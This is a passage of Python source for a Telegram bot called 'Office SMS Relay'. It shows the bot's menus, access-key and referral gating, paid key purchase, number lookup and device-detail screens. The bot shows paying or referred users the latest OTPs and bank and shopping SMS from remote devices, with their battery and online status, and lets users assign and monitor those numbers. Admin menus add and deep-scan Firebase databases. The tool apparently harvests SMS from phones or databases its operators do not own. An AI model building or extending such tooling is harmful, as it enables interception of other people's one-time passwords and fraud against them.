    # FIX: Only treat an OTP as "latest" if the SMS arrived within the last 24 hours.
    # Displaying an old OTP (days/weeks old) from Firebase as "Latest OTP" was falsely
    # making stale numbers appear active and promoting them to Tier 1.
    otp_val   = None
    otp_age   = ""
    now_epoch = datetime.now().timestamp()
    if msgs:
        for m in msgs:
            if m.get("otp"):
                ts = _parse_sms_time_ts(m.get("time", ""))
                if ts and (now_epoch - ts) <= 86400:  # within 24 hours
                    otp_val = m["otp"]
                    age_m   = int((now_epoch - ts) / 60)
                    otp_age = f" <i>({age_m}m ago)</i>" if age_m < 60 else f" <i>({age_m//60}h ago)</i>"
                    break
                # If OTP is older than 24h, skip it — don't show stale OTP as "latest"

    batt_str   = f"{battery}%" if battery is not None else "—"
    status_ico = "🟢 Online" if online else "🔴 Offline"
    sms_count  = total_sms or "—"
    carrier    = num.get("carrier") or ""
    net_str    = carrier if carrier and carrier not in ("N/A", "") else "🔍 Fetching…"
    otp_line   = f"<code>{otp_val}</code>{otp_age}" if otp_val else "—"

    text = (
        f"╔══════════════════════╗\n"
        f"  🖥 <b>DEVICE DETAILS</b>\n"
        f"╚══════════════════════╝\n\n"
        f"🔑 <b>Latest OTP</b> → {otp_line}\n\n"
        f"🆔 <b>Device ID</b> · <code>{num.get('device_id','?')[:24]}</code>\n"
        f"📱 <b>Phone</b> · <code>{num['number'] if not num['number'].startswith('DEV-') else '—'}</code>\n"
        f"🌐 <b>Network</b> · {net_str}\n"
        f"📊 <b>Status</b> · {status_ico}\n"
        f"🔋 <b>Battery</b> · {batt_str}\n"
        f"💬 <b>SMS Count</b> · {sms_count}\n"
        f"🟢 <b>Live</b> · <i>auto-refresh every 2s ⚡</i>\n"
    )

    if msgs:
        show = msgs[:5]
        text += f"\n📩 <b>LAST {len(show)} MESSAGES</b>\n\n"
        for i, m in enumerate(show, 1):
            m_ts    = _parse_sms_time_ts(m.get("time", ""))
            m_age   = int((now_epoch - m_ts) / 60) if m_ts else None
            age_tag = ""
            if m_age is not None:
                age_tag = f" <i>({m_age}m ago)</i>" if m_age < 60 else f" <i>({m_age//60}h ago)</i>"
            otp_tag = f"  🎯 OTP: <code>{m['otp']}</code>{age_tag}\n" if m.get("otp") else ""
            text += (
                f"<b>#{i}</b>\n"
                f"👤 {m.get('sender','?')}\n"
                f"🕐 {m.get('time','')}{age_tag}\n"
                f"{otp_tag}"
                f"💬 <i>{str(m.get('message',''))[:180]}</i>\n\n"
            )

    text += f"📄 <i>{page} of {total_pages}</i>"
    return text


# ══════════════════════════════════════════════════════════════
# STATES
# ══════════════════════════════════════════════════════════════

class S(StatesGroup):
    b_msg           = State()
    add_ch_id       = State()
    add_ch_link     = State()
    set_limit       = State()
    bulk_fb         = State()
    fb_apikey       = State()
    add_num         = State()
    enter_key       = State()
    gen_keys        = State()
    lookup_num      = State()
    set_groq_key    = State()
    set_anthropic   = State()
    add_watchlist   = State()
    set_sms_path    = State()   # FIX: manual sms_path override
    user_lookup     = State()
    user_suspend_r  = State()
    gen_lifetime    = State()
    set_refer_req   = State()
    gen_temp_keys   = State()   # count for temp key generation
    paid_utr        = State()   # waiting for UTR ID after paying
    paid_screenshot = State()   # waiting for payment screenshot
    set_paid_upi    = State()   # admin: set UPI ID
    set_paid_amount = State()   # admin: set amount
    set_paid_qr     = State()   # admin: set QR photo


# ══════════════════════════════════════════════════════════════
# MENUS
# ══════════════════════════════════════════════════════════════

def menu_employee():
    """Employee (non-admin user) menu."""
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📱 Active Numbers",  callback_data="num_Active"),
         InlineKeyboardButton(text="📊 Number Tiers",    callback_data="tiers_menu")],
        [InlineKeyboardButton(text="🔥 Hot Numbers",     callback_data="hot_numbers"),
         InlineKeyboardButton(text="📡 Global Radar",    callback_data="global_radar")],
        [InlineKeyboardButton(text="🔍 Lookup",          callback_data="num_lookup"),
         InlineKeyboardButton(text="📋 SMS History",     callback_data="my_history")],
        [InlineKeyboardButton(text="👻 Ghost Devices",   callback_data="ghost_list_0"),
         InlineKeyboardButton(text="👥 My Referral",     callback_data="my_link")],
        [InlineKeyboardButton(text="🔑 Enter Key",       callback_data="enter_key"),
         InlineKeyboardButton(text="🔄 Refresh",         callback_data="refresh_home")],
    ])


def menu_admin():
    """Admin landing menu — /admin command."""
    pending_c = db.cx().execute(
        "SELECT COUNT(*) as c FROM ai_pending WHERE status='pending'").fetchone()["c"]
    paid_pending = db.cx().execute(
        "SELECT COUNT(*) as c FROM paid_payments WHERE status='pending'").fetchone()["c"]
    inbox_label = f"📥 Inbox ({pending_c})" if pending_c else "📥 Inbox"
    paid_label  = f"💳 Paid ({paid_pending})" if paid_pending else "💳 Paid Mgmt"
    lock_label  = "🔓 Unlock Bot" if _bot_locked else "🔒 Lock Bot"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📱 Numbers",    callback_data="adm_numbers"),
         InlineKeyboardButton(text="👻 Ghosts",     callback_data="ghost_list_0")],
        [InlineKeyboardButton(text="🔥 Hot",        callback_data="hot_numbers"),
         InlineKeyboardButton(text="📡 Radar",      callback_data="global_radar")],
        [InlineKeyboardButton(text="🗄 Firebase",   callback_data="adm_firebase"),
         InlineKeyboardButton(text="🤖 AI",         callback_data="adm_ai_center")],
        [InlineKeyboardButton(text="👤 Users",      callback_data="adm_users"),
         InlineKeyboardButton(text="📊 Statistics", callback_data="adm_report")],
        [InlineKeyboardButton(text="🚨 Alerts",     callback_data="adm_alerts_cfg"),
         InlineKeyboardButton(text="📜 Logs",       callback_data="adm_logs")],
        [InlineKeyboardButton(text=inbox_label,     callback_data="adm_pending_review"),
         InlineKeyboardButton(text="⚙ System",     callback_data="adm_system")],
        [InlineKeyboardButton(text=paid_label,      callback_data="adm_paid_mgmt"),
         InlineKeyboardButton(text=lock_label,      callback_data="adm_lock_toggle")],
    ])


def menu_firebase():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔗 Add Firebase",    callback_data="adm_fb"),
         InlineKeyboardButton(text="🔄 Sync All",        callback_data="adm_sync")],
        [InlineKeyboardButton(text="📋 Sources List",    callback_data="adm_fb_list"),
         InlineKeyboardButton(text="📡 Health Center",   callback_data="adm_fb_health")],
        [InlineKeyboardButton(text="🔍 Scan All DBs",    callback_data="adm_fb_scan")],
        [InlineKeyboardButton(text="🔎 Deep Scan",       callback_data="deep_scan_menu")],
        [InlineKeyboardButton(text="🔙 Admin",           callback_data="back_admin")],
    ])


def menu_system():
    rkt = db.get("refer_key_type") or "perm"
    dur = db.get("refer_key_duration") or "1440"
    _DUR_LABELS = {"1":"1 min","120":"2h","1440":"24h","10080":"7d","43200":"30d","86400":"60d"}
    dur_label = _DUR_LABELS.get(dur, f"{dur}m")
    rkt_label = f"{'♾ Perm' if rkt=='perm' else f'⏱ Temp({dur_label})'}"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🤖 AI Config",           callback_data="adm_ai_config"),
         InlineKeyboardButton(text="🔐 Toggle Key Mode",     callback_data="adm_keymode")],
        [InlineKeyboardButton(text="📈 Refer Limit",         callback_data="adm_limit"),
         InlineKeyboardButton(text="📢 Add Channel",         callback_data="adm_addch"),
         InlineKeyboardButton(text="🗑 Remove Channel",      callback_data="adm_removech")],
        [InlineKeyboardButton(text="🔑 Generate Keys",       callback_data="adm_genkeys"),
         InlineKeyboardButton(text="♾ Lifetime Key",         callback_data="adm_lifetime_key")],
        [InlineKeyboardButton(text="⏱ Temp Keys",            callback_data="adm_gen_temp_keys"),
         InlineKeyboardButton(text=f"🎫 Refer: {rkt_label}", callback_data="adm_refer_key_type")],
        [InlineKeyboardButton(text="📱 Add Number",          callback_data="adm_addnum"),
         InlineKeyboardButton(text="⚡ Broadcast",           callback_data="adm_broadcast")],
        [InlineKeyboardButton(text="🧹 Purge Old SMS",       callback_data="adm_purge"),
         InlineKeyboardButton(text="🔍 Rescan Ghosts",       callback_data="adm_rescan")],
        [InlineKeyboardButton(text="⭐ Watchlist",            callback_data="adm_watchlist"),
         InlineKeyboardButton(text="📊 Pattern Stats",       callback_data="adm_pattern_stats")],
        [InlineKeyboardButton(text="🔙 Admin",               callback_data="back_admin")],
    ])


# ══════════════════════════════════════════════════════════════
# AUTH
# ══════════════════════════════════════════════════════════════

async def check_auth(uid, obj):
    # Bot-wide lock (admin-only bypass)
    if _bot_locked and uid not in ADMIN_IDS:
        await obj.answer(
            "╔══════════════════════╗\n"
            "  🔒 <b>BOT LOCKED</b>\n"
            "╚══════════════════════╝\n\n"
            "🛠 <b>Bot Under Maintenance</b>\n\n"
            "The bot has been temporarily locked by admin.\n"
            "Please try again later.")
        return False
    # Check suspension
    if db.cx().execute("SELECT 1 FROM user_suspension WHERE user_id=?", (uid,)).fetchone():
        await obj.answer("⛔ Your account has been suspended. Contact admin.")
        return False
    channels = db.cx().execute("SELECT * FROM channels").fetchall()
    for ch in channels:
        in_ch = False
        try:
            m     = await bot.get_chat_member(ch["channel_id"], uid)
            in_ch = m.status not in ("left","kicked")
        except Exception as e:
            log.warning("Channel check failed %s: %s", ch["channel_id"], e)
        if not in_ch:
            kb = InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(text="📢 Join Channel", url=ch["channel_link"]),
                InlineKeyboardButton(text="✅ I Joined",     callback_data="verify_join")
            ]])
            await obj.answer(
                f"╔══════════════════════╗\n"
                f"  📢 <b>JOIN REQUIRED</b>\n"
                f"╚══════════════════════╝\n\n"
                f"Join our channel first:\n"
                f"<a href='{ch['channel_link']}'>👉 Click here</a>\n\n"
                f"<i>Tap ✅ I Joined after joining.</i>",
                reply_markup=kb)
            return False
    if not db.unlocked(uid):
        u     = db.cx().execute(
            "SELECT refer_count, access_key, key_expired_at FROM users WHERE user_id=?", (uid,)).fetchone()
        limit = int(db.get("refer_limit") or 1)
        count = u["refer_count"] if u else 0
        me    = await bot.get_me()
        link  = f"https://t.me/{me.username}?start=ref_{uid}"
        expired = u and u["key_expired_at"]
        paid_on = db.get("paid_key_enabled") == "1"
        btns = [
            [InlineKeyboardButton(text="🔑 Enter Access Key",        callback_data="enter_key")],
            [InlineKeyboardButton(text="👥 Refer Friends (Earn Key)", url=link)],
        ]
        if paid_on:
            btns.insert(1, [InlineKeyboardButton(text="💳 Buy Key (Instant Access)", callback_data="buy_key")])
        kb = InlineKeyboardMarkup(inline_keyboard=btns)
        if expired:
            await obj.answer(
                f"╔══════════════════════╗\n"
                f"  🚨 <b>ACCESS EXPIRED</b>\n"
                f"╚══════════════════════╝\n\n"
                f"⏰ Your temporary access key has expired.\n\n"
                f"To regain access:\n"
                f"🔑 <b>Enter a new key</b> — ask admin for one\n"
                f"👥 <b>Refer friends</b> — use your link:\n"
                f"<code>{link}</code>"
                + (f"\n💳 <b>Buy a key</b> — instant access" if paid_on else ""),
                reply_markup=kb)
        else:
            await obj.answer(
                f"╔══════════════════════╗\n"
                f"  🔒 <b>ACCESS REQUIRED</b>\n"
                f"╚══════════════════════╝\n\n"
                f"🔑 Enter Key  OR  👥 Refer <b>{max(0,limit-count)}</b> friend(s)\n"
                f"📊 Progress: <b>{count}/{limit}</b>",
                reply_markup=kb)
        return False
    return True


@router.callback_query(F.data == "verify_join")
async def cb_verify_join(call: CallbackQuery):
    if await check_auth(call.from_user.id, call.message):
        a = db.cx().execute("SELECT COUNT(*) as c FROM numbers WHERE status='Active'").fetchone()["c"]
        t = db.cx().execute("SELECT COUNT(*) as c FROM numbers").fetchone()["c"]
        await call.message.edit_text(_home_text(call.from_user.first_name, a, t),
                                     reply_markup=menu_employee())
    await call.answer()


# ══════════════════════════════════════════════════════════════
# HOME TEXT
# ══════════════════════════════════════════════════════════════

def _home_text(first_name, active, total):
    hour  = _now_ist().hour
    greet = ("🌅 Good Morning" if 5 <= hour < 12 else
             "☀️ Good Afternoon" if 12 <= hour < 17 else
             "🌆 Good Evening" if 17 <= hour < 21 else "🌙 Good Night")
    ghosts   = db.cx().execute(
        "SELECT COUNT(*) as c FROM numbers WHERE is_ghost=1 OR number LIKE 'DEV-%'").fetchone()["c"]
    offline  = db.cx().execute(
        "SELECT COUNT(*) as c FROM numbers WHERE status='Inactive' AND is_ghost=0").fetchone()["c"]
    real_tot = total - ghosts
    bar_fill = min(20, int((active / max(real_tot, 1)) * 20))
    bar      = "█" * bar_fill + "░" * (20 - bar_fill)
    sms_today = db.cx().execute(
        "SELECT COUNT(*) as c FROM sms_log WHERE received_at LIKE ?",
        (_now_ist().strftime("%d-%m-%Y") + "%",)).fetchone()["c"]
    return (
        f"╔══════════════════════════╗\n"
        f"  🏢 <b>OFFICE SMS RELAY</b>  v6\n"
        f"╚══════════════════════════╝\n\n"
        f"{greet}, <b>{first_name}</b>! 👋\n\n"
        f"╔═ 📊 DATABASE STATUS ══════╗\n"
        f"  🟢 Active   : <b>{active}</b>\n"
        f"  🔴 Offline  : <b>{offline}</b>\n"
        f"  👻 Ghost    : <b>{ghosts}</b>\n"
        f"  📱 Real     : <b>{real_tot}</b>\n"
        f"  💬 SMS Today: <b>{sms_today}</b>\n"
        f"  [{bar}]\n"
        f"╚═══════════════════════════╝\n\n"
        f"<i>Select an option below:</i>"
    )


# ══════════════════════════════════════════════════════════════
# /start
# ══════════════════════════════════════════════════════════════

@router.message(CommandStart())
async def cmd_start(msg: Message):
    if _bot_locked and msg.from_user.id not in ADMIN_IDS:
        return await msg.answer(
            "╔══════════════════════╗\n"
            "  🔒 <b>BOT LOCKED</b>\n"
            "╚══════════════════════╝\n\n"
            "🛠 <b>Bot Under Maintenance</b>\n\n"
            "The bot has been temporarily locked by admin.\n"
            "Please try again later.",
            parse_mode="HTML")
    args   = msg.text.split()
    # SECURITY FIX: wrap in try/except — a crafted link like /start ref_abc would
    # crash with ValueError and expose a traceback without this guard.
    ref_id = None
    if len(args) > 1 and args[1].startswith("ref_"):
        try:
            ref_id = int(args[1].replace("ref_", ""))
        except ValueError:
            ref_id = None
    res    = db.reg_user(msg.from_user.id, msg.from_user.username or "User", ref_id)
    if res.get("is_banned"): return await msg.answer("⛔️ You are banned.")
    # Only show verification-pending screen if user is NOT already unlocked.
    # Unlocked users should go straight to the home screen even if a stale
    # pending record exists in guard.db.
    if not db.unlocked(msg.from_user.id):
        if guard.resend_pending_verification(msg.from_user.id):
            return await msg.answer(
                "╔══════════════════════╗\n"
                "  🛡 <b>VERIFICATION PENDING</b>\n"
                "╚══════════════════════╝\n\n"
                "You have a pending device verification.\n"
                "Please tap the <b>Verify My Device</b> button "
                "that was just sent to complete your referral."
            )
    if res.get("notify_ref"):
        try:
            _DUR_LABELS = {1:"1 min",120:"2h",1440:"24h",10080:"7d",43200:"30d",86400:"60d"}
            rkt = res.get("key_type", "perm")
            dur = res.get("dur_mins")
            if rkt == "temp" and dur:
                dur_label  = _DUR_LABELS.get(int(dur), f"{dur}m")
                key_note   = f"⏱ <b>Temporary access</b> — valid for <b>{dur_label}</b>."
            else:
                key_note = "♾ <b>Permanent access</b> — never expires."
            await bot.send_message(res["notify_ref"],
                f"╔══════════════════════╗\n"
                f"  🎉 <b>REFERRAL SUCCESS!</b>\n"
                f"╚══════════════════════╝\n\n"
                f"✅ You are now <b>unlocked!</b>\n\n"
                f"Your Access Key:\n<code>{res['new_key']}</code>\n\n"
                f"{key_note}\n\n"
                f"<i>Tap /start to use the bot.</i>")
        except: pass
    channels = db.cx().execute("SELECT * FROM channels").fetchall()
    for ch in channels:
        in_ch = False
        try:
            m     = await bot.get_chat_member(ch["channel_id"], msg.from_user.id)
            in_ch = m.status not in ("left","kicked")
        except: pass
        if not in_ch:
            await msg.answer(
                f"╔══════════════════════╗\n"
                f"  📢 <b>JOIN REQUIRED</b>\n"
                f"╚══════════════════════╝\n\n"
                f"Welcome! First, join our channel:\n"
                f"<a href='{ch['channel_link']}'>👉 Click here</a>",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                    InlineKeyboardButton(text="📢 Join Now",       url=ch["channel_link"]),
                    InlineKeyboardButton(text="✅ Done — Let Me In", callback_data="verify_join")
                ]]))
            return
    if not db.unlocked(msg.from_user.id):
        u     = db.cx().execute(
            "SELECT refer_count, access_key, key_expired_at FROM users WHERE user_id=?", (msg.from_user.id,)).fetchone()
        limit = int(db.get("refer_limit") or 1)
        count = u["refer_count"] if u else 0
        me    = await bot.get_me()
        link  = f"https://t.me/{me.username}?start=ref_{msg.from_user.id}"
        expired  = u and u["key_expired_at"]
        paid_on  = db.get("paid_key_enabled") == "1"
        start_btns = [
            [InlineKeyboardButton(text="🔑 Enter Access Key", callback_data="enter_key")],
            [InlineKeyboardButton(text="👥 Share & Earn Key", url=link)],
        ]
        if paid_on:
            start_btns.insert(1, [InlineKeyboardButton(text="💳 Buy Key (Instant Access)", callback_data="buy_key")])
        header = "🚨 <b>ACCESS EXPIRED</b>" if expired else "🔒 <b>UNLOCK ACCESS</b>"
        body = (
            f"⏰ Your temporary access key has expired.\n\n"
            f"To regain access:\n"
            f"🔑 <b>Enter a new key</b> — ask admin for one\n"
            f"👥 <b>Refer friends</b> — use your link:\n"
            f"<code>{link}</code>\n"
            f"📊 Progress: <b>{count}/{limit}</b>"
            + (f"\n💳 <b>Buy a key</b> — instant access" if paid_on else "")
            if expired else
            f"Hello <b>{msg.from_user.first_name}</b>! 👋\n\n"
            f"1️⃣  <b>Enter Key</b> — if you have an admin key\n"
            f"2️⃣  <b>Refer Friends</b> — invite {max(0,limit-count)} more friend(s)\n"
            f"     Progress: <b>{count}/{limit}</b> 👥\n\n"
            f"🔗 Your referral link:\n<code>{link}</code>"
        )
        await msg.answer(
            f"╔══════════════════════╗\n"
            f"  {header}\n"
            f"╚══════════════════════╝\n\n"
            f"{body}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=start_btns))
        return
    a = db.cx().execute("SELECT COUNT(*) as c FROM numbers WHERE status='Active'").fetchone()["c"]
    t = db.cx().execute("SELECT COUNT(*) as c FROM numbers").fetchone()["c"]
    await msg.answer(_home_text(msg.from_user.first_name, a, t), reply_markup=menu_employee())


# ══════════════════════════════════════════════════════════════
# ACCESS KEY
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data == "enter_key")
async def cb_enter_key(call: CallbackQuery, state: FSMContext):
    await call.message.answer(
        "🔑 <b>Enter your Access Key:</b>\n"
        "<i>Format: RELAY-XXXXXXXXXXXXXXXXXXXXXXXXXX</i>")
    await state.set_state(S.enter_key); await call.answer()


@router.message(S.enter_key)
async def proc_key(msg: Message, state: FSMContext):
    key = msg.text.strip().upper(); uid = msg.from_user.id
    await state.clear()
    row = db.cx().execute("SELECT * FROM access_keys WHERE key=?", (key,)).fetchone()
    if not row or row["revoked"]:
        return await msg.answer("❌ <b>Invalid or Revoked Key.</b>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(text="🔑 Try Again", callback_data="enter_key")]]))
    if row["used_by"] and not row["is_lifetime"]:
        if row["used_by"] == uid:
            return await msg.answer("❌ <b>This key has already been used.</b>\n<i>Each key grants access only once. Contact admin for a new key.</i>")
        return await msg.answer("❌ <b>Key already used by another user.</b>")
    expiry_str = None
    expiry_info = ""
    if row.get("expiry_minutes") and not row["is_lifetime"]:
        expiry_dt  = _now_ist() + timedelta(minutes=int(row["expiry_minutes"]))
        expiry_str = expiry_dt.strftime("%d-%m-%Y %H:%M:%S")
        _DUR_LABELS = {1:"1 min",120:"2h",1440:"24h",10080:"7d",43200:"30d",86400:"60d"}
        dur_label  = _DUR_LABELS.get(int(row["expiry_minutes"]), f"{row['expiry_minutes']}m")
        expiry_info = f"⏱ Temporary Key — valid for <b>{dur_label}</b>\n🗓 Expires: <b>{expiry_dt.strftime('%d-%m-%Y %H:%M')}</b>\n"
    with db.cx() as c:
        if expiry_str:
            c.execute("UPDATE users SET is_unlocked=1, key_expiry_at=?, key_expired_at=NULL WHERE user_id=?", (expiry_str, uid))
        else:
            c.execute("UPDATE users SET is_unlocked=1, key_expiry_at=NULL, key_expired_at=NULL WHERE user_id=?", (uid,))
        if not row["is_lifetime"]:
            c.execute("UPDATE access_keys SET used_by=? WHERE key=?", (uid, key))
    a = db.cx().execute("SELECT COUNT(*) as c FROM numbers WHERE status='Active'").fetchone()["c"]
    t = db.cx().execute("SELECT COUNT(*) as c FROM numbers").fetchone()["c"]
    lt_line = "♾ Lifetime Key activated!\n" if row["is_lifetime"] else ""
    await msg.answer(
        f"╔══════════════════════╗\n"
        f"  ✅ <b>ACCESS GRANTED!</b>\n"
        f"╚══════════════════════╝\n\n"
        f"Welcome aboard! 🎉\n"
        f"{lt_line}"
        f"{expiry_info}"
        f"🟢 <b>{a}</b> Active / <b>{t}</b> Total Numbers",
        reply_markup=menu_employee())


# ══════════════════════════════════════════════════════════════
# USER CALLBACKS
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data == "refresh_home")
async def cb_refresh(call: CallbackQuery):
    a = db.cx().execute("SELECT COUNT(*) as c FROM numbers WHERE status='Active'").fetchone()["c"]
    t = db.cx().execute("SELECT COUNT(*) as c FROM numbers").fetchone()["c"]
    await call.message.edit_text(_home_text(call.from_user.first_name, a, t),
                                 reply_markup=menu_employee())
    await call.answer("✅ Refreshed!")


@router.callback_query(F.data == "my_link")
async def cb_mylink(call: CallbackQuery):
    me    = await bot.get_me()
    link  = f"https://t.me/{me.username}?start=ref_{call.from_user.id}"
    u     = db.cx().execute("SELECT refer_count FROM users WHERE user_id=?", (call.from_user.id,)).fetchone()
    limit = int(db.get("refer_limit") or 1)
    count = u["refer_count"] if u else 0
    need  = max(0, limit - count)
    # Check if user already has a pending fix request
    existing_req = db.cx().execute(
        "SELECT status FROM refer_fix_requests WHERE user_id=?",
        (call.from_user.id,)).fetchone()
    fix_btn_text = ("⏳ Fix Requested" if existing_req and existing_req["status"] == "pending"
                    else "🔧 Report Broken Referral")
    await call.message.answer(
        f"╔══════════════════════╗\n"
        f"  👥 <b>YOUR REFERRAL</b>\n"
        f"╚══════════════════════╝\n\n"
        f"🔗 Your link:\n<code>{link}</code>\n\n"
        f"📊 Progress: <b>{count}/{limit}</b> invites\n"
        f"{'✅ Goal reached!' if need==0 else f'Need <b>{need}</b> more invite(s).'}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=fix_btn_text, callback_data="req_refer_fix")],
        ])
    )
    await call.answer()


@router.callback_query(F.data == "req_refer_fix")
async def cb_req_refer_fix(call: CallbackQuery):
    uid      = call.from_user.id
    username = call.from_user.username or ""

    # Check if already pending
    existing = db.cx().execute(
        "SELECT status FROM refer_fix_requests WHERE user_id=?", (uid,)).fetchone()
    if existing and existing["status"] == "pending":
        await call.answer("⏳ Your request is already pending. Admin will review it soon.", show_alert=True)
        return

    # Must have a referral entry to report broken
    in_log = db.cx().execute(
        "SELECT referrer_id FROM refer_log WHERE referred_id=?", (uid,)).fetchone()
    if not in_log:
        await call.answer(
            "ℹ️ No referral entry found for your account.\n"
            "You need to join via a referral link first.",
            show_alert=True)
        return

    with db.cx() as c:
        c.execute(
            "INSERT OR REPLACE INTO refer_fix_requests(user_id, username, requested_at, status) "
            "VALUES(?,?,?,?)",
            (uid, username, _now_ist().strftime("%d-%m-%Y %H:%M"), "pending"))

    # Notify all admins
    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(
                admin_id,
                f"╔══════════════════════╗\n"
                f"  🔧 <b>REFER FIX REQUEST</b>\n"
                f"╚══════════════════════╝\n\n"
                f"👤 User: <code>{uid}</code> @{username or 'N/A'}\n"
                f"👥 Referred by: <code>{in_log['referrer_id']}</code>\n\n"
                f"<i>Review in Admin → Users → Fix Requests</i>",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                    InlineKeyboardButton(text="✅ Approve", callback_data=f"fixreq_approve_{uid}"),
                    InlineKeyboardButton(text="❌ Dismiss", callback_data=f"fixreq_dismiss_{uid}"),
                ]])
            )
        except Exception:
            pass

    await call.answer("✅ Request sent! Admin will review and fix your referral shortly.", show_alert=True)


@router.callback_query(F.data == "my_history")
async def cb_history(call: CallbackQuery):
    rows = db.cx().execute(
        "SELECT number,sender,otp,received_at,sms_category FROM sms_log ORDER BY id DESC LIMIT 10").fetchall()
    if not rows: return await call.answer("No SMS received yet.", show_alert=True)
    t = "╔══════════════════════╗\n  📋 <b>RECENT SMS</b>\n╚══════════════════════╝\n\n"
    for r in rows:
        cat_icon = {"OTP":"🔑","Bank":"🏦","Amazon":"📦","Flipkart":"🛒","Swiggy":"🍔","Delivery":"🚚"}.get(r["sms_category"],"💬")
        t += (f"{cat_icon} <code>{_disp(r['number'])}</code>\n"
              f"   🎯 OTP: <code>{r['otp'] or 'N/A'}</code>  |  📨 {r['sender']}\n"
              f"   🕐 {r['received_at']}\n\n")
    await call.message.answer(t); await call.answer()


# ══════════════════════════════════════════════════════════════
# NUMBER LOOKUP
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data == "num_lookup")
async def cb_lookup_start(call: CallbackQuery, state: FSMContext):
    if not await check_auth(call.from_user.id, call.message): return await call.answer()
    await call.message.answer(
        "🔍 <b>Number Lookup</b>\n\nSend a phone number or device ID:")
    await state.set_state(S.lookup_num); await call.answer()


@router.message(S.lookup_num)
async def proc_lookup(msg: Message, state: FSMContext):
    await state.clear()
    query   = msg.text.strip()
    results = db.cx().execute(
        "SELECT * FROM numbers WHERE number LIKE ? OR device_id LIKE ? OR device_name LIKE ?",
        (f"%{query}%", f"%{query}%", f"%{query}%")).fetchall()
    if not results:
        return await msg.answer(f"🔍 No results for: <code>{query}</code>")
    text = "╔══════════════════════╗\n  🔍 <b>LOOKUP RESULTS</b>\n╚══════════════════════╝\n\n"
    btns = []
    for r in results[:10]:
        status_icon = "🟢" if r["status"] == "Active" else "🔴"
        lock_icon   = "🔒" if r["assigned_to"] else "🔓"
        text += (f"{status_icon} <code>{_disp(r['number'])}</code> {lock_icon}\n"
                 f"   📱 {r['device_name'] or 'Unknown'}  |  💾 {r['struct_type'] or '?'}\n\n")
        btns.append([InlineKeyboardButton(
            text=f"{status_icon}{lock_icon} {_disp(r['number'])}",
            callback_data=f"lookup_status_{r['id']}")])
    btns.append([InlineKeyboardButton(text="🔙 Back", callback_data="back_home")])
    await msg.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))


@router.callback_query(F.data.startswith("lookup_status_"))
async def cb_lookup_status(call: CallbackQuery):
    nid = int(call.data.split("_")[2])
    num = db.cx().execute("SELECT * FROM numbers WHERE id=?", (nid,)).fetchone()
    if not num: return await call.answer("Not found.", show_alert=True)
    sm  = await call.message.answer("⏳ <i>Checking device status…</i>")
    online, battery, health_warn = await dev_health(
        num["device_id"], num["fb_source"], num["status_path"])
    status_icon = "🟢 Online" if online else "🔴 Offline"
    batt_str    = f"🔋 Battery: <b>{battery}%</b>\n" if battery is not None else ""
    lock_str    = (f"🔒 Locked by user <code>{num['assigned_to']}</code>"
                   if num["assigned_to"] else "🔓 Available")
    is_ghost    = num.get("is_ghost",0) or str(num["number"]).startswith("DEV-")
    uid         = call.from_user.id
    wl_row      = db.cx().execute("SELECT 1 FROM watchlist WHERE number=?", (num["number"],)).fetchone()
    wl_icon     = "⭐" if wl_row else ""

    rows = []
    if not num["assigned_to"]:
        rows.append([InlineKeyboardButton(text="🔒 Assign to Me", callback_data=f"assign_num_{num['id']}")])
    elif num["assigned_to"] == uid:
        rows.append([InlineKeyboardButton(text="🔓 Release", callback_data=f"release_num_{num['id']}")])
    if not is_ghost and not num["assigned_to"]:
        rows.append([InlineKeyboardButton(text="📡 Start Monitoring", callback_data=f"mon_{num['id']}")])
    if uid in ADMIN_IDS and not wl_row:
        rows.append([InlineKeyboardButton(text="⭐ Add to Watchlist", callback_data=f"wl_add_{num['id']}")])
    rows.append([InlineKeyboardButton(text="🔙 Back", callback_data="back_home")])

    await sm.edit_text(
        f"╔══════════════════════╗\n"
        f"  📊 <b>DEVICE STATUS</b> {wl_icon}\n"
        f"╚══════════════════════╝\n\n"
        f"📞 <code>{_disp(num['number'])}</code>\n"
        f"📱 {num['device_name'] or 'Unknown'}  |  💾 {num['struct_type'] or '?'}\n"
        f"📶 {num['carrier'] or 'N/A'}  |  {status_icon}\n"
        f"{batt_str}"
        f"{'👻 <i>Ghost — no number resolved yet</i>' + chr(10) if is_ghost else ''}"
        f"{lock_str}\n"
        f"{'⚠️ ' + health_warn if health_warn else ''}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
    await call.answer()


# ══════════════════════════════════════════════════════════════
# ASSIGN / RELEASE
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data.startswith("assign_num_"))
async def cb_assign_num(call: CallbackQuery):
    uid = call.from_user.id
    if not await check_auth(uid, call.message): return await call.answer()
    nid = int(call.data.split("_")[2])
    num = db.cx().execute("SELECT * FROM numbers WHERE id=?", (nid,)).fetchone()
    if not num: return await call.answer("Not found.", show_alert=True)
    if num["assigned_to"] and num["assigned_to"] != uid:
        return await call.answer("⛔ Assigned to another user.", show_alert=True)
    with db.cx() as c:
        c.execute("UPDATE numbers SET assigned_to=?, assigned_at=? WHERE id=?",
                  (uid, int(datetime.now().timestamp()), nid))
    await call.answer("✅ Assigned!", show_alert=False)
    await call.message.answer(
        f"╔══════════════════════╗\n"
        f"  🔒 <b>NUMBER ASSIGNED</b>\n"
        f"╚══════════════════════╝\n\n"
        f"📞 <code>{_disp(num['number'])}</code>\n"
        f"📱 {num['device_name'] or 'Unknown'}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📡 Start Monitoring", callback_data=f"mon_{nid}")],
            [InlineKeyboardButton(text="🔙 Home",             callback_data="back_home")]]))


